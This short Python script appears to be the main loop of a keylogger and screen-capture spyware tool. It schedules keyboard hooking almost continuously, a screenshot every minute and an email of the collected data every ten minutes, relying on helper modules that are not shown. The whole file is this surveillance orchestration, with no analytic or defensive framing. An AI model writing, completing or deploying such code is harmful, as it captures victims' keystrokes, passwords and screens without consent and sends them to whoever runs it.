import Hook_Keyboard
import PrintScreen
import Email_Connection
import schedule


schedule.every(1).minutes.do(PrintScreen.take_screen)
schedule.every(10).minutes.do(Email_Connection.sendmail)
schedule.every(0.001).seconds.do(Hook_Keyboard.hook_keyboard)
while True:
    schedule.run_pending()



